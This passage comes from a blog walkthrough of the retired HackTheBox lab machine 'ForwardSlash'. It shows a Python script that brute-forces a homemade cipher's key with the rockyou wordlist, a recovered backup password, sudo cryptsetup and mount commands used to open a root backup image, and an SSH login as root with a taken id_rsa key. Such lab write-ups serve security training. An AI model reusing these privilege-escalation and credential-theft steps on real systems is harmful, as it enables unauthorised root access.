</pre></table></code></div></div><p>this is a encrypted image that require a password .In the home folder of <code class="language-plaintext highlighter-rouge">pain</code> there is a cypher and <code class="language-plaintext highlighter-rouge">encrypter.py</code></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>pain@forwardslash:~/encryptorinator$ ls
ciphertext  encrypter.py
pain@forwardslash:~/encryptorinator$ 
</pre></table></code></div></div><p>By analyzing the code i was able able to decrypt using this script</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
</pre><td class="rouge-code"><pre><span class="k">def</span> <span class="nf">encrypt</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">msg</span><span class="p">):</span>
    <span class="n">key</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
    <span class="n">msg</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">char_key</span> <span class="ow">in</span> <span class="n">key</span><span class="p">:</span>
        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">msg</span><span class="p">)):</span>
            <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
                <span class="n">tmp</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">msg</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">+</span> <span class="nb">ord</span><span class="p">(</span><span class="n">char_key</span><span class="p">)</span> <span class="o">+</span> <span class="nb">ord</span><span class="p">(</span><span class="n">msg</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="n">tmp</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">msg</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">+</span> <span class="nb">ord</span><span class="p">(</span><span class="n">char_key</span><span class="p">)</span> <span class="o">+</span> <span class="nb">ord</span><span class="p">(</span><span class="n">msg</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>

            <span class="k">while</span> <span class="n">tmp</span> <span class="o">&gt;</span> <span class="mi">255</span><span class="p">:</span>
                <span class="n">tmp</span> <span class="o">-=</span> <span class="mi">256</span>
            <span class="n">msg</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">tmp</span><span class="p">)</span>
    <span class="k">return</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">msg</span><span class="p">):</span>
    <span class="n">key</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
    <span class="n">msg</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">char_key</span> <span class="ow">in</span> <span class="nb">reversed</span><span class="p">(</span><span class="n">key</span><span class="p">):</span>
        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">reversed</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">msg</span><span class="p">))):</span>
            <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
                <span class="n">tmp</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">msg</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">-</span> <span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">char_key</span><span class="p">)</span> <span class="o">+</span> <span class="nb">ord</span><span class="p">(</span><span class="n">msg</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]))</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="n">tmp</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">msg</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">-</span> <span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">char_key</span><span class="p">)</span> <span class="o">+</span> <span class="nb">ord</span><span class="p">(</span><span class="n">msg</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="mi">1</span><span class="p">]))</span>
            <span class="k">while</span> <span class="n">tmp</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">:</span>
                <span class="n">tmp</span> <span class="o">+=</span> <span class="mi">256</span>
            <span class="n">msg</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">tmp</span><span class="p">)</span>
    <span class="k">return</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>

<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'ciphertext'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">ciphertext</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">().</span><span class="n">rstrip</span><span class="p">()</span>
<span class="k">try</span><span class="p">:</span>
    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'/usr/share/wordlists/rockyou.txt'</span><span class="p">,</span> <span class="s">'r'</span><span class="p">)</span> <span class="k">as</span> <span class="n">infile</span><span class="p">:</span>
        <span class="c1">#wordSet = infile.readline()
</span>        <span class="k">for</span> <span class="n">myline</span> <span class="ow">in</span> <span class="n">infile</span><span class="p">:</span>                 <span class="c1"># For each line, read it to a string 
</span>            <span class="n">msg</span> <span class="o">=</span> <span class="n">decrypt</span><span class="p">(</span><span class="n">myline</span><span class="p">.</span><span class="n">strip</span><span class="p">(),</span> <span class="n">ciphertext</span><span class="p">)</span>
            <span class="k">if</span> <span class="s">'AND '</span> <span class="ow">in</span> <span class="n">msg</span> <span class="ow">or</span> <span class="s">'and '</span> <span class="ow">in</span> <span class="n">msg</span> <span class="ow">or</span> <span class="s">'of '</span> <span class="ow">in</span> <span class="n">msg</span> <span class="ow">or</span> <span class="s">'OF '</span> <span class="ow">in</span> <span class="n">msg</span> <span class="ow">or</span> <span class="s">'key '</span> <span class="ow">in</span> <span class="n">msg</span> <span class="ow">or</span> <span class="s">'password '</span> <span class="ow">in</span> <span class="n">msg</span><span class="p">:</span>
            	<span class="k">print</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
		<span class="k">print</span><span class="p">(</span><span class="s">"the key is: "</span><span class="o">+</span><span class="n">myline</span><span class="p">)</span>
<span class="k">except</span> <span class="nb">IOError</span><span class="p">:</span>
       <span class="k">print</span> <span class="s">'error opening file'</span>
</pre></table></code></div></div><p>result:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>root@kali:~/Desktop/hacktheboxmachine/forward# python encrypter.py 
H�[�2f�v/v�XLly�you liked my new encryption tool, pretty secure huh, anyway here is the key to the encrypted image from /var/backups/recovery: cB!6%sdH8Lj^@Y*$C2cf
the key is: teamareporsiempre
</pre></table></code></div></div><p>the <code class="language-plaintext highlighter-rouge">.img</code> file password is <code class="language-plaintext highlighter-rouge">cB!6%sdH8Lj^@Y*$C2cf</code><br /> now i can run the commands as root to decrypt this image.<br /></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>sudo -u root /sbin/cryptsetup luksOpen /var/backups/recovery/encrypted_backup.img backup
</pre></table></code></div></div><blockquote><p><strong>Note</strong>: you need to mount only to <code class="language-plaintext highlighter-rouge">backup</code> because you have permission to mount <code class="language-plaintext highlighter-rouge">/dev/mapper/backup</code> as root</p></blockquote><p>to verify run <code class="language-plaintext highlighter-rouge">fdisk -l</code></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>pain@forwardslash:~/encryptorinator$ sudo -u root /sbin/cryptsetup luksOpen /var/backups/recovery/encrypted_backup.img backup
Enter passphrase for /var/backups/recovery/encrypted_backup.img: 
pain@forwardslash:~/encryptorinator$ fdisk -l
fdisk: cannot open /dev/loop0: Permission denied
fdisk: cannot open /dev/loop1: Permission denied
fdisk: cannot open /dev/loop2: Permission denied
fdisk: cannot open /dev/sda: Permission denied
fdisk: cannot open /dev/sr0: Permission denied
fdisk: cannot open /dev/mapper/backup: Permission denied
pain@forwardslash:~/encryptorinator$ 
</pre></table></code></div></div><p>I have now <code class="language-plaintext highlighter-rouge">/dev/mapper/backup</code> created , i can make the <code class="language-plaintext highlighter-rouge">mnt</code> folder and mount the image</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>mkdir mnt
sudo -u root /bin/mount /dev/mapper/backup ./mnt/
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">cd mnt</code> and you get the root <code class="language-plaintext highlighter-rouge">id_rsa</code> <br /> Finally , i can ssh to root</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
</pre><td class="rouge-code"><pre>root@kali:~/Desktop/hacktheboxmachine/forward# chmod 600 root_id
root@kali:~/Desktop/hacktheboxmachine/forward# ssh -i root_id root@forwardslash.htb 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed May  6 14:12:38 UTC 2020

  System load:  0.0                Processes:            183
  Usage of /:   30.7% of 19.56GB   Users logged in:      0
  Memory usage: 10%                IP address for ens33: 10.10.10.183
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

16 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue Mar 24 12:11:46 2020 from 10.10.14.3
root@forwardslash:~# ls
root.txt
root@forwardslash:~# wc -c root.txt 
33 root.txt
root@forwardslash:~# 
</pre></table></code></div></div><p>Rooted :) Your Feedback is appreciated</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>Hackthebox</a>, <a href='/categories/retired/'>retired</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/lfi/" class="post-tag no-text-decoration" >LFI</a> <a href="/tags/crypto/" class="post-tag no-text-decoration" >crypto</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><!-- Post sharing snippet v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=ForwardSlash - yassine&url=https://0xyassine.github.io//posts/ForwardSlash/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=ForwardSlash - yassine&u=https://0xyassine.github.io//posts/ForwardSlash/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=ForwardSlash - yassine&url=https://0xyassine.github.io//posts/ForwardSlash/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><!-- The Pannel on right side (Desktop views) v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"><h3 data-toc-skip>Recent Update</h3><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/traceback/">Traceback</a></li><li><a href="/posts/cache/">Cache</a></li><li><a href="/posts/admirer/">Admirer</a></li><li><a href="/posts/Quick/">Quick</a></li><li><a href="/posts/ForwardSlash/">ForwardSlash</a></li></ul></div><div id="access-tags"><h3 data-toc-skip>Trending Tags</h3><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <!-- The trending tags list v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung MIT Licensed --> <a class="post-tag" href="/tags/crypto/">crypto</a> <a class="post-tag" href="/tags/web-shell/">web shell</a> <a class="post-tag" href="/tags/sqlmap/">sqlmap</a> <a class="post-tag" href="/tags/smbclient/">smbclient</a> <a class="post-tag" href="/tags/python/">python</a> <a class="post-tag" href="/tags/mysql/">mysql</a> <a class="post-tag" href="/tags/microsoft-azure/">microsoft azure</a> <a class="post-tag" href="/tags/john/">john</a> <a class="post-tag" href="/tags/gtfobins/">gtfobins</a> <a class="post-tag" href="/tags/docker/">docker</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><h3 data-toc-skip class="pl-3 pt-2 mb-3">Contents</h3><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="post-extend-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <!-- Navigation buttons at the bottom of the post. v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --><div class="post-navigation d-flex justify-content-between"> <a href="/posts/obscurity/" class="btn btn-outline-primary"><p>Obscurity</p></a> <a href="/posts/Quick/" class="btn btn-outline-primary"><p>Quick</p></a></div><!-- The Disqus lazy loading. Powered by: https://osvaldas.info/lazy-loading-disqus-comments v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung MIT License --><div id="disqus" class="pt-2 pb-4"><p class="font-italic text-muted small">Comments powered by <a href="https://disqus.com/">Disqus</a>.</p></div><script src="/assets/lib/jquery.disqusloader.min.js"></script> <script> var options = { scriptUrl: '//0xyassine.disqus.com/embed.js', disqusConfig: function() { this.page.url = 'https://0xyassine.github.io//posts/ForwardSlash/'; this.page.identifier = '/posts/ForwardSlash/'; } }; $.disqusLoader('#disqus', options); </script> <!-- The related posts of current post. Placed in the bottom of every single post. v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div id="related-posts" class="mt-4 mb-2 mb-sm-4 pb-2"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/obscurity/"><div class="card-body"> <span class="timeago small"> May 8, 2020 <i class="unloaded">2020-05-08T00:00:00+03:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Obscurity</h3><div class="text-muted small"><p>Obscurity from HackTheBox Obscurity was retired . It was a Good box with a lot of python auditing … nmap scan 1 nmap -sV -sC -v 10.10.10.168 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19...</p></div></div></a></div><div class="card"> <a href="/posts/openadmin/"><div class="card-body"> <span class="timeago small"> May 1, 2020 <i class="unloaded">2020-05-01T00:00:00+03:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>OpenAdmin</h3><div class="text-muted small"><p>OpenAdmin from HackTheBox OpenAdmin was retired .It was easy and fun box with web attack and priv escalation techniques so let’s start … nmap scan: 1 nmap -sV -sC 10.10.10.171 -v 1 2 3 4 5...</p></div></div></a></div><div class="card"> <a href="/posts/Quick/"><div class="card-body"> <span class="timeago small"> May 9, 2020 <i class="unloaded">2020-05-09T00:00:00+03:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Quick</h3><div class="text-muted small"><p>Quick from HackTheBox Very good box with new attack vector and techniques so let’s start Note: add 10.10.10.186 to your host file as quick.htb to use it instead of the ip nmap scan 1 nm...</p></div></div></a></div></div></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const observer = lozad(); observer.observe(); </script> <!-- The Footer v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2020 <a href="https://www.facebook.com/mouhamed.yassin.90">Mohammad YASSINE</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div></div></footer></div><!-- The Search results v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted">Trending Tags</h4><!-- The trending tags list v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung MIT Licensed --> <a class="post-tag" href="/tags/crypto/">crypto</a> <a class="post-tag" href="/tags/web-shell/">web shell</a> <a class="post-tag" href="/tags/sqlmap/">sqlmap</a> <a class="post-tag" href="/tags/smbclient/">smbclient</a> <a class="post-tag" href="/tags/python/">python</a> <a class="post-tag" href="/tags/mysql/">mysql</a> <a class="post-tag" href="/tags/microsoft-azure/">microsoft azure</a> <a class="post-tag" href="/tags/john/">john</a> <a class="post-tag" href="/tags/gtfobins/">gtfobins</a> <a class="post-tag" href="/tags/docker/">docker</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <!-- Jekyll Simple Search loader v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js" integrity="sha256-qcLR00zq6pJk4je3MLgAri8Nn+ZumUlXgTKR2H/xCY0=" crossorigin="anonymous"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://0xyassine.github.io/{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
